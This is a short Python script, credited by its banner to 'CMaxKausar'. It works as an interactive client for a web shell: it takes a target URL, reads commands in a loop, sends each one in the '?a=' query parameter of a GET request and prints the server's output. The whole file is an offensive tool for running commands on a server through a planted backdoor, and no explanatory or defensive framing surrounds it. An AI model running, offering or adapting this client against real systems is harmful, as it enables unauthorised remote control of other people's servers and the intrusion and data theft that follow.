import requests
import os
import subprocess
import sys
 
print('''
          _            
    /\   | |          
   /  \  | |
  / /\ \ | | 
 / ____ \| |   
/_/    \_\_| --------------- V 1.0 
                       Made BY CMaxKausar                   ''')

print()
url= input('Enter The Correct URL: ')
print()
print("......Connection Established......... : )")
print()
while True:
    
      try:
          payload ='?a='
          command = input("Execute Commands: ")
          r = requests.get(url + payload + command)
          r.raise_for_status()
          print(r.text)
          if command == "exit":
              exit()
      except:
           print("########### Thanks For Using CMaxKausar. #############")
           exit()
        
